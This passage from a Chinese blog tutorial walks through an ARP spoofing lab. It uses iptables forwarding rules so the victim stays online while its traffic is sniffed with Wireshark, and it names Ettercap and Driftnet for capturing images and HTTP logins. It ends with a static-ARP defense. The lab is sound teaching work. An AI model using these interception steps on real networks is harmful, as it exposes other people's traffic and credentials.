+<p>iptables的结构：iptables -&gt; Tables -&gt; Chains -&gt; Rules. 简单地讲，tables由chains组成，而chains又由rules组成。其中iptables具有Filter, NAT, Mangle, Raw四种内建表。</p>
+<p>Filter表示iptables的默认表，因此如果你没有自定义表，那么就默认使用filter表，它具有以下三种内建链：</p>
+<ul>
+<li>INPUT链：处理来自外部的数据。</li>
+<li>OUTPUT链：处理向外发送的数据。</li>
+<li>FORWARD链：将数据转发到本机的其他网卡设备上。</li>
+</ul>
+<p>而这其中涉及我们的ARP攻击中路由转发一块的的则是FORWARD链了，我们要对其规则进行配置。</p>
+<p><strong>解决步骤：</strong></p>
+<ul>
+<li><p>清空规则</p>
+<p>在攻击主机上执行<code>iptables -F FORWARD</code>命令</p>
+<p>-F表示删除现有的iptables规则，FORWARD即Filter中FORWARD链，该命令首先清空FORWARD链中原有规则。</p>
+</li>
+<li><p>新建追加规则</p>
+<p>在攻击主机上执行<code>iptables -A FORWARD -j ACCPET</code>命令</p>
+<p>-A chain：制定要追加规则的链</p>
+<p>-j：执行目标（jump to target），指定了当与规则(Rule)匹配时如何处理数据包</p>
+<ul>
+<li>可能的值是ACCEPT, DROP, QUEUE, RETURN，MASQUERADE</li>
+<li>还可以指定其他链（Chain）作为目标</li>
+</ul>
+<p>该规则则是表明允许防火墙接收数据包。</p>
+</li>
+</ul>
+</li>
+<li><p>再验证</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#目标主机上操作
+root@ubuntu1:~# arp
+Address                  HWtype  HWaddress           Flags Mask            Iface
+10.211.55.12             ether   00:1c:42:61:22:c3   C                     enp0s5
+_gateway                 ether   00:1c:42:61:22:c3   C                     enp0s5
+#攻击成功
+root@ubuntu1:~# ping www.baidu.com
+PING www.a.shifen.com (110.242.68.4) 56(84) bytes of data.
+64 bytes from 110.242.68.4 (110.242.68.4): icmp_seq&#x3D;1 ttl&#x3D;127 time&#x3D;31.8 ms
+64 bytes from 110.242.68.4 (110.242.68.4): icmp_seq&#x3D;2 ttl&#x3D;127 time&#x3D;36.8 ms
+From 10.211.55.12 icmp_seq&#x3D;3 Redirect Host(New nexthop: 1.55.211.10)
+64 bytes from 110.242.68.4 (110.242.68.4): icmp_seq&#x3D;3 ttl&#x3D;127 time&#x3D;37.4 ms
+64 bytes from 110.242.68.4 (110.242.68.4): icmp_seq&#x3D;4 ttl&#x3D;127 time&#x3D;50.5 ms
+#目标主机仍能上网<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li>
+</ol>
+<h4 id="对目标主机进行流量嗅探"><a href="#对目标主机进行流量嗅探" class="headerlink" title="对目标主机进行流量嗅探"></a>对目标主机进行流量嗅探</h4><p>实施ARP欺骗攻击时，目标主机此时上网，比如访问百度等。</p>
+<p>在攻击主机上利用Wireshark抓包：</p>
+<ul>
+<li><p>监控网卡eth0</p>
+</li>
+<li><p>通过fliter进行筛选：<code>ip.addr == 10.211.55.13</code>抓目标主机上的网络包</p>
+<p><img src="/images/postimage/arp5.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以观察到目标主机现在正在访问110.242.68.3，在浏览器输入该IP发现正是百度网站。</p>
+</li>
+</ul>
+<p>当然还可以利用其他工具，如Ettercap、Driftnet等工具嗅探，获取目标主机上的图片以及登录HTTP网站相关隐私信息等</p>
+<h2 id="ARP攻击的危害"><a href="#ARP攻击的危害" class="headerlink" title="ARP攻击的危害"></a>ARP攻击的危害</h2><ol>
+<li>造成局域网中的其他主机断网。</li>
+<li>劫持局域网中其他主机或网关的流量，获取敏感信息等。</li>
+</ol>
+<h2 id="ARP攻击的防御"><a href="#ARP攻击的防御" class="headerlink" title="ARP攻击的防御"></a>ARP攻击的防御</h2><p>ARP攻击主要是利用ARP的缺陷进行攻击的，由于用户不能修改协议，所以防范ARP攻击与欺骗只能借助一些工具，如静态ARP，ARP防火墙等。</p>
+<p>以下通过静态ARP实现ARP攻击的防御：</p>
+<p>所谓静态ARP，则是进行IP-MAC地址绑定，用户通过在主机和网关上实现双向IP地址和MAC地址绑定，即可提高网络的安全性。</p>
+<ol>
+<li><p>查看当前主机ARP缓存表，判断ARP条目是动态的还是静态的（通过Flags Mask列，C表示动态ARP条目，CM表示静态ARP条目）</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@ubuntu1:~# arp -n
+Address        HWtype  HWaddress           Flags Mask            Iface
+10.211.55.2    ether   3e:06:30:10:d4:64   C                     enp0s5
+10.211.55.12   ether   00:1c:42:61:22:c3   C                     enp0s5
+10.211.55.1    ether   00:1c:42:00:00:18   C                     enp0s5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>由于一般攻击者会采取对网关实施ARP攻击，所以我们对网关的IP和MAC进行静态绑定。</p>
+</li>
+<li><p>对网关的IP和MAC进行静态绑定</p>
+<p><code>arp -s 10.211.55.1 00:1c:42:00:00:18</code></p>
+</li>
+<li><p>再次查看ARP缓存表</p>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@ubuntu1:~# arp -n
+Address        HWtype  HWaddress           Flags Mask            Iface
+10.211.55.2    ether   3e:06:30:10:d4:64   C                     enp0s5
+10.211.55.12   ether   00:1c:42:61:22:c3   C                     enp0s5
+10.211.55.1    ether   00:1c:42:00:00:18   CM                    enp0s5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>从中可以发现网关的IP和MAC已经进行静态绑定。</p>
+</li>
+</ol>
+<blockquote>
+<p>注：手动创建的静态ARP重启之后就没有了，若要防御，需重新绑定。</p>
+</blockquote>
+<blockquote>
+<p><strong>参考资料：</strong></p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq991658923/article/details/121345147">MacBookPro M1 Parallels Desktop 安装 Ubuntu</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34449006/article/details/81177325?ops_request_misc=&request_id=&biz_id=102&utm_term=arp%E6%94%BB%E5%87%BB%E6%98%AF%E5%9C%A8%E6%94%BB%E5%87%BB%E6%9C%BA%E4%B8%8A%E5%BC%80%E5%90%AF%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-81177325.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187">ARP攻击</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40007804/article/details/109884992?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164491585516780269896028%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164491585516780269896028&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-109884992.first_rank_v2_pc_rank_v29&utm_term=arp%E6%94%BB%E5%87%BB%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%BC%80%E5%90%AF%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91&spm=1018.2226.3001.4187">kali流量转发后依然断网_ARP断网攻击和防御</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.v2ex.com/t/255279">fedora23 开启 IP 转发无效，求解</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011537073/article/details/82685586">iptables基础知识详解</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_47311097/article/details/110104106?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164493328616780274141301%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164493328616780274141301&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-110104106.first_rank_v2_pc_rank_v29&utm_term=arp%E6%94%BB%E5%87%BB%E5%90%8E%E5%BC%80%E5%90%AF%E4%BA%86%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91%E4%BB%BB&spm=1018.2226.3001.4187">parrotOS下利用arpspoof实现arp欺骗及路由转发问题</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_13570193/2083332">ARP原理和ARP攻击</a></li>
+<li>从实践中学习网络防护与反入侵，大学霸IT达人编著，机械工业出版社</li>
+</ol>
+</blockquote>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/">网络攻防实战</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ARP/">ARP</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/bf862eab.html">
+                        <span class="hidden-mobile">CentOS7下安装MPICH及运行并行程序</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/@waline/client@1/dist/Waline.min.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://blog-comment-eta.vercel.app/","path":"window.location.pathname","placeholder":null,"meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"html[data-user-color-scheme=\"dark\"]","avatar":"retro","avatarCDN":"https://seccdn.libravatar.org/avatar/","avatarForce":false,"wordLimit":0,"pageSize":10,"highlight":true},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        new Waline(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          Fluid.plugins.initFancyBox('#waline .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+    
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?0aae2bb9475d846643a0f05755d8a37b";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":"true#是否在手机端显示"},"log":false});</script></body>
+</html>
